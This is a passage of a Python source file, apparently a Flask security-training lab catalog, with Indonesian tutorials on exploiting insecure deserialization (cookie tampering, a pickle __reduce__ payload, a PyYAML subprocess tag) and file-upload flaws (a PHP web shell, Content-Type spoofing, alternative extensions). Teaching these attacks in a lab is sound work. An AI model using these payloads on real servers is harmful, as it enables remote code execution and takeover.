<p><b>Insecure Deserialization</b> adalah kerentanan yang muncul ketika data yang tidak tepercaya digunakan untuk merekonstruksi ulang sebuah objek (deserialisasi) tanpa validasi yang aman. Serangan paling dasar melibatkan pengubahan (<i>tampering</i>) atribut objek tersebut sebelum dikirim kembali ke server.</p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">2. Alat dan Bahan</h3>
<ul class="list-disc pl-5 space-y-2 mb-4 text-gray-700">
    <li><b>Burp Suite (Repeater) / Browser DevTools:</b> Untuk melihat dan memodifikasi <i>cookie</i>.</li>
    <li><b>CyberChef (Web) atau Terminal:</b> Untuk melakukan <i>Decode</i> dan <i>Encode</i> format Base64.</li>
</ul>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">3. Langkah Eksploitasi</h3>
<ol class="list-decimal pl-5 space-y-2 mb-4">
<li>Buka halaman lab. Aplikasi melacak sesi Anda menggunakan <i>cookie</i> bernama <code>session_obj</code>.</li>
<li>Salin nilai <i>cookie</i> tersebut. Nilai ini tampak seperti string acak panjang, yang sebenarnya adalah format <b>Base64</b>.</li>
<li>Gunakan CyberChef (atau <code>echo "nilai_cookie" | base64 -d</code> di Linux) untuk mendekode <i>cookie</i> tersebut. Anda akan melihat objek JSON: <code>{"username": "wiener", "is_admin": false}</code>.</li>
<li>Ubah nilai <code>false</code> menjadi <code>true</code> sehingga menjadi: <code>{"username": "wiener", "is_admin": true}</code>.</li>
<li><i>Encode</i> kembali string JSON yang baru tersebut menggunakan Base64.</li>
<li>Ganti nilai <i>cookie</i> <code>session_obj</code> di browser/Burp Anda dengan nilai Base64 yang baru.</li>
<li>Muat ulang halaman. Anda kini berhasil memanipulasi logika aplikasi dan masuk sebagai Admin!</li>
</ol>
            """
        },
        "practitioner": {
            "title": "Remote Code Execution (RCE) via Python Pickle",
            "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
            "goal": "Eksploitasi <i>endpoint</i> yang menggunakan pustaka <code>pickle</code> Python secara tidak aman untuk mengeksekusi perintah sistem (RCE).",
            "tutorial": """
<h3 class="text-xl font-bold text-navy-900 mt-6 mb-3">1. Bahaya Modul Pickle</h3>
<p>Pustaka <code>pickle</code> bawaan Python digunakan untuk mengubah objek Python menjadi aliran bita (<i>byte stream</i>) dan sebaliknya. Dokumentasi resmi Python secara eksplisit memperingatkan: <b>Jangan pernah melakukan unpickle pada data yang berasal dari sumber yang tidak tepercaya</b>.</p>
<p>Hal ini karena pustaka <code>pickle</code> memungkinkan pendefinisian metode <i>magic</i> <code>__reduce__()</code> yang akan dieksekusi secara otomatis saat objek dibangun ulang (deserialisasi).</p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">2. Alat dan Bahan</h3>
<ul class="list-disc pl-5 space-y-2 mb-4 text-gray-700">
    <li><b>Python Interpreter:</b> Untuk membuat <i>payload</i> (skrip eksploitasi) di komputer lokal Anda.</li>
    <li><b>Burp Suite:</b> Untuk menyuntikkan <i>payload</i> ke server.</li>
</ul>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">3. Membuat Payload</h3>
<p>Buat file <code>exploit.py</code> di komputer Anda dengan kode berikut, lalu jalankan. Skrip ini akan mencetak <i>payload</i> Base64 yang siap disuntikkan.</p>
<pre>import pickle
import base64
import os

class Exploit(object):
    def __reduce__(self):
        # Perintah ini akan dieksekusi oleh server
        return (os.system, ('ping -c 3 127.0.0.1',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)</pre>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">4. Langkah Eksploitasi</h3>
<ol class="list-decimal pl-5 space-y-2 mb-4">
<li>Jalankan skrip di atas. Salin <i>string</i> Base64 yang dihasilkan.</li>
<li>Buka halaman lab. Anda akan melihat sebuah form yang meminta "Token Sesi".</li>
<li>Tempelkan <i>string</i> Base64 tersebut ke dalam form dan klik <b>Validasi Token</b>.</li>
<li>Meskipun layar menunjukkan pesan <i>error</i> (karena tipe kembalian tidak sesuai harapan server), perintah sistem <code>ping</code> Anda telah berhasil dieksekusi di latar belakang server! (Anda dapat mengubah <i>payload</i> untuk melakukan <i>reverse shell</i> pada skenario nyata).</li>
</ol>
            """
        },
        "expert": {
            "title": "RCE via YAML Deserialization",
            "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
            "goal": "Eksploitasi parser YAML yang tidak aman (<code>yaml.unsafe_load</code> atau <code>yaml.load</code>) untuk mengeksekusi perintah Python dan mengambil alih server.",
            "tutorial": """
<h3 class="text-xl font-bold text-navy-900 mt-6 mb-3">1. Kerentanan PyYAML</h3>
<p>Pustaka <code>PyYAML</code> pada Python sering digunakan untuk membaca file konfigurasi. Pada versi lama, fungsi <code>yaml.load()</code> secara <i>default</i> menggunakan <i>loader</i> yang tidak aman, yang memungkinkan inisialisasi objek kustom Python menggunakan tag khusus spesifikasi YAML.</p>
<p>Meskipun versi terbaru telah menggantinya dengan <code>safe_load()</code>, banyak sistem warisan (<i>legacy</i>) atau <i>developer</i> yang kurang waspada masih menggunakan <code>yaml.unsafe_load()</code>.</p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">2. Alat dan Bahan</h3>
<ul class="list-disc pl-5 space-y-2 mb-4 text-gray-700">
    <li><b>Browser (Form Input):</b> Untuk menempelkan struktur teks konfigurasi YAML.</li>
</ul>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">3. Langkah Eksploitasi</h3>
<ol class="list-decimal pl-5 space-y-2 mb-4">
<li>Halaman lab menerima teks dalam format YAML untuk mengatur konfigurasi antarmuka (warna, judul).</li>
<li>Alih-alih memberikan konfigurasi normal seperti <code>color: blue</code>, kita bisa menggunakan tag YAML kustom bawaan Python (<code>!!python/object/apply</code>) untuk memanggil modul sistem.</li>
<li>Salin <i>payload</i> YAML di bawah ini dan tempelkan ke dalam kotak input konfigurasi.</li>
</ol>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">Payload YAML RCE:</h3>
<pre>color: blue
title: !!python/object/apply:subprocess.check_output [["whoami"]]</pre>
<p>Saat server menguraikan (<i>parse</i>) YAML tersebut, server akan memanggil pustaka <code>subprocess</code>, mengeksekusi perintah <code>whoami</code>, dan menyematkan hasil <i>output</i> (nama pengguna sistem operasi server) ke dalam variabel <code>title</code> yang kemudian dicetak ke layar!</p>
            """
        }
    },
    "file-upload": {
        "apprentice": {
            "title": "Unrestricted File Upload",
            "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
            "goal": "Unggah file <i>web shell</i> PHP sederhana untuk mendapatkan simulasi eksekusi kode (RCE) di server.",
            "tutorial": """
<h3 class="text-xl font-bold text-navy-900 mt-6 mb-3">1. Teori Dasar</h3>
<p>Kerentanan unggah file (<i>File Upload Vulnerability</i>) terjadi ketika server web mengizinkan pengguna mengunggah file tanpa memvalidasi secara ketat nama, jenis, isi, atau ukurannya. Jika server dikonfigurasi untuk mengeksekusi file tertentu (seperti <code>.php</code>, <code>.jsp</code>, atau <code>.asp</code>), penyerang dapat mengunggah skrip berbahaya (<i>web shell</i>) untuk mengambil alih server.</p>
<p><i>Catatan: Karena lab ini berjalan di atas Flask (Python), backend telah diprogram untuk <b>mensimulasikan</b> eksekusi mesin PHP (Apache/Nginx) secara virtual demi keamanan.</i></p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">2. Alat dan Bahan</h3>
<ul class="list-disc pl-5 space-y-2 mb-4 text-gray-700">
    <li><b>Teks Editor:</b> Notepad, VSCode, atau nano untuk membuat file <i>payload</i>.</li>
    <li><b>Browser:</b> Untuk mengunggah file secara langsung.</li>
</ul>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">3. Langkah Eksploitasi</h3>
<ol class="list-decimal pl-5 space-y-2 mb-4">
<li>Buka teks editor Anda dan buat sebuah file baru bernama <code>shell.php</code>.</li>
<li>Isi file tersebut dengan skrip pembuktian (Proof of Concept) sederhana: <code>&lt;?php echo "SISTEM_DIKUASAI"; ?&gt;</code>.</li>
<li>Buka halaman lab (Fitur Unggah Avatar).</li>
<li>Pilih file <code>shell.php</code> yang baru Anda buat, lalu klik <b>Unggah Avatar</b>.</li>
<li>Karena tidak ada validasi apa pun di sisi server, file PHP tersebut akan diterima dan "dieksekusi" oleh simulator, menampilkan pesan keberhasilan.</li>
</ol>
            """
        },
        "practitioner": {
            "title": "Bypass Content-Type Validation",
            "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
            "goal": "Bypass validasi jenis file yang mengandalkan header HTTP <code>Content-Type</code> dengan menggunakan Burp Suite, lalu unggah file PHP.",
            "tutorial": """
<h3 class="text-xl font-bold text-navy-900 mt-6 mb-3">1. Analisis Validasi Content-Type</h3>
<p>Banyak developer mencoba mengamankan form unggah file dengan memeriksa nilai header <code>Content-Type</code> yang dikirim oleh browser (misalnya, mengharapkan <code>image/jpeg</code> atau <code>image/png</code>). Namun, nilai ini sepenuhnya berada di bawah kendali klien (pengguna) dan dapat dimanipulasi dengan mudah menggunakan <i>proxy interceptor</i>.</p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">2. Alat dan Bahan</h3>
<ul class="list-disc pl-5 space-y-2 mb-4 text-gray-700">
    <li><b>Burp Suite (Proxy / Intercept):</b> Alat wajib untuk mencegat (<i>intercept</i>) dan memodifikasi struktur <i>multipart/form-data</i> sebelum mencapai server.</li>
</ul>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">3. Langkah Eksploitasi</h3>
<ol class="list-decimal pl-5 space-y-2 mb-4">
<li>Siapkan file <code>shell.php</code> dari level sebelumnya.</li>
<li>Jika Anda mencoba mengunggahnya secara langsung melalui browser, server akan menolak dengan pesan "Hanya file gambar (image/jpeg, image/png) yang diizinkan".</li>
<li>Aktifkan fitur <b>Intercept</b> pada Burp Suite.</li>
<li>Lakukan proses unggah file <code>shell.php</code> lagi melalui browser. <i>Request</i> akan tertahan di Burp Suite.</li>
<li>Cari bagian <i>body request</i> yang berisi batas (<i>boundary</i>) file Anda. Anda akan melihat baris: <code>Content-Type: application/x-php</code> (atau <code>application/octet-stream</code>).</li>
<li>Ubah nilai tersebut secara manual menjadi <code>Content-Type: image/jpeg</code>.</li>
<li>Klik <b>Forward</b> untuk meneruskan <i>request</i> yang telah dimodifikasi ke server. Validasi berhasil dilewati!</li>
</ol>
            """
        },
        "expert": {
            "title": "Bypass Blacklist Extension",
            "video_url": "https://www.youtube.com/embed/dQw4w9WgXcQ",
            "goal": "Bypass filter <i>blacklist</i> yang memblokir ekstensi <code>.php</code> dengan menggunakan ekstensi alternatif yang masih bisa dieksekusi oleh server web.",
            "tutorial": """
<h3 class="text-xl font-bold text-navy-900 mt-6 mb-3">1. Konsep Filter Blacklist</h3>
<p>Beberapa aplikasi menerapkan <i>blacklist</i> (daftar hitam) untuk memblokir ekstensi file yang dianggap berbahaya secara spesifik, seperti <code>.php</code>, <code>.exe</code>, atau <code>.sh</code>.</p>
<p>Kelemahan dari <i>blacklist</i> adalah penyerang dapat menggunakan ekstensi alternatif yang tidak ada dalam daftar larangan, tetapi masih dipetakan oleh konfigurasi server web (seperti Apache/Nginx) untuk dieksekusi sebagai mesin interpreter yang sama.</p>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">2. Alat dan Bahan</h3>
<ul class="list-disc pl-5 space-y-2 mb-4 text-gray-700">
    <li><b>Burp Suite (Intruder) - Opsional:</b> Berguna jika Anda ingin melakukan <i>fuzzing</i> daftar ekstensi (misal: menggunakan <i>SecLists/Discovery/Web-Content/web-extensions.txt</i>).</li>
</ul>

<h3 class="text-xl font-bold text-navy-900 mt-8 mb-3">3. Langkah Eksploitasi</h3>
<ol class="list-decimal pl-5 space-y-2 mb-4">
<li>Coba unggah <code>shell.php</code>. Aplikasi akan menolak dengan tegas: "Ekstensi .php diblokir demi keamanan".</li>
<li>Ubah nama file <i>payload</i> Anda. Dalam lingkungan PHP, ekstensi alternatif seperti <code>.php3</code>, <code>.php4</code>, <code>.php5</code>, <code>.phtml</code>, atau <code>.phar</code> sering kali luput dari <i>blacklist</i> developer namun tetap dieksekusi secara otomatis oleh modul Apache (<code>mod_php</code>).</li>
<li>Ubah nama file menjadi <code>shell.phtml</code> atau <code>shell.php5</code>.</li>
<li>Unggah file tersebut. <i>Blacklist</i> berhasil dilewati dan simulasi eksekusi akan berjalan!</li>
</ol>
            """
        }
    },
}

# Placeholder tutorial generik untuk kategori yang belum diimplementasikan penuh
GENERIC_PLACEHOLDER = {
    "title": "Lab sedang disiapkan",
    "goal": "Modul ini akan segera memiliki lab interaktif yang bisa diserang.",
    "tutorial": """
<p>Tutorial dan lab interaktif untuk level ini sedang dalam pengembangan. Struktur katalog sudah
menyediakan slot untuk 3 level (apprentice, practitioner, expert) pada kategori ini — tinggal
menambahkan route Flask baru mengikuti pola kategori yang sudah ada (SQL injection, XSS, command
injection, path traversal) di <code>labs/</code>.</p>
""",
}

def get_lab(category_slug, level):
    cat = LABS.get(category_slug, {})
    return cat.get(level, GENERIC_PLACEHOLDER)